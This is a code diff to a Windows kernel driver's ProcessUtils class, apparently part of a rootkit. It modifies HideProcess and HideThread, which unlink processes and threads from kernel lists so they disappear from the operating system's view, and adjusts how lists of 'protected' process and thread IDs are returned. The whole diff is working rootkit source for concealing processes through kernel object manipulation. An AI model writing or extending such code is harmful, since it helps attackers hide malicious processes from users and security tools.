@@ -125,7 +125,6 @@ NTSTATUS ProcessUtils::HideProcess(ULONG pid) {
 
 	// Using the ActiveProcessLinks lock to avoid accessing problems.
 	PEX_PUSH_LOCK listLock = (PEX_PUSH_LOCK)((ULONG_PTR)targetProcess + lockOffset);
-	AutoLock locker(this->ProcessesLock);
 	ExAcquirePushLockExclusive(listLock);
 
 	// Saving the hidden process' list entry for the future to release it.
@@ -217,9 +216,15 @@ NTSTATUS ProcessUtils::HideThread(ULONG tid) {
 	PEX_PUSH_LOCK listLock = (PEX_PUSH_LOCK)((ULONG_PTR)targetThread + lockOffset);
 
 	ExAcquirePushLockExclusive(listLock);
-	RemoveListLinks(threadListEntry);
-	ExReleasePushLockExclusive(listLock);
 
+	__try {
+		RemoveEntryList(threadListEntry);
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		status = STATUS_UNSUCCESSFUL;
+	}
+
+	ExReleasePushLockExclusive(listLock);
 	ObDereferenceObject(targetThread);
 	return status;
 }
@@ -605,11 +610,16 @@ void ProcessUtils::ClearProtectedThreads() {
 * There is no return value.
 */
 void ProcessUtils::QueryProtectedProcesses(OutputProtectedProcessesList* list) {
+	ULONG outputIndex = 0;
+
 	AutoLock locker(this->ProcessesLock);
 	list->PidsCount = this->ProtectedProcesses.PidsCount;
 
 	for (ULONG i = 0; i < this->ProtectedProcesses.PidsCount; i++) {
-		list->Processes[i] = this->ProtectedProcesses.Processes[i];
+		if (this->ProtectedProcesses.Processes[i] != 0) {
+			list->Processes[outputIndex] = this->ProtectedProcesses.Processes[i];
+			outputIndex++;
+		}
 	}
 }
 
@@ -623,11 +633,16 @@ void ProcessUtils::QueryProtectedProcesses(OutputProtectedProcessesList* list) {
 * Returns:
 * There is no return value.
 */
-void ProcessUtils::QueryProtectedThreads(ThreadsList* list) {
+void ProcessUtils::QueryProtectedThreads(OutputThreadsList* list) {
+	ULONG outputIndex = 0;
+
 	AutoLock locker(this->ThreadsLock);
 	list->TidsCount = this->ProtectedThreads.TidsCount;
 
 	for (ULONG i = 0; i < this->ProtectedThreads.TidsCount; i++) {
-		list->Threads[i] = this->ProtectedThreads.Threads[i];
+		if (this->ProtectedThreads.Threads[i] != 0) {
+			list->Threads[outputIndex] = this->ProtectedThreads.Threads[i];
+			outputIndex++;
+		}
 	}
 }
